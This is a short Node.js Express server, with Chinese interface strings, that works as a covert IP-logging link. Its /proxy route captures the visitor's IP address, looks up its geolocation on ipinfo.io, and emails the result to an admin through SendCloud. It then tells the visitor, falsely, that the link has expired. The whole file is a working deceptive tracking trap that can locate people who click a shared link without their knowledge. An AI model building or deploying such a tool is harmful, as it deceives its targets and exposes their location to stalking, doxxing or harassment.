const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const querystring = require('querystring');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const SENDCLOUD_API_USER = process.env.SENDCLOUD_API_USER;
const SENDCLOUD_API_KEY = process.env.SENDCLOUD_API_KEY;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;

app.get('/proxy', async (req, res) => {
  try {
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const ipInfoResponse = await axios.get(`https://ipinfo.io/${clientIp}?token=${IPINFO_TOKEN}`);
    const ipData = ipInfoResponse.data;

    const emailContent = `
      <p>B用户访问信息:</p>
      <pre>${JSON.stringify(ipData, null, 2)}</pre>
    `;

    const sendMailResponse = await axios.post('https://api.sendcloud.net/apiv2/mail/send', querystring.stringify({
      apiUser: SENDCLOUD_API_USER,
      apiKey: SENDCLOUD_API_KEY,
      from: 'no-reply@yourdomain.com',
      to: ADMIN_EMAIL,
      subject: '新用户访问通知',
      html: emailContent
    }), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    res.send('链接失效了，重新获取吧！');
  } catch (error) {
    console.error(error);
    res.status(500).send('服务器错误，请稍后再试。');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`服务器正在运行在端口 ${PORT}`);
});
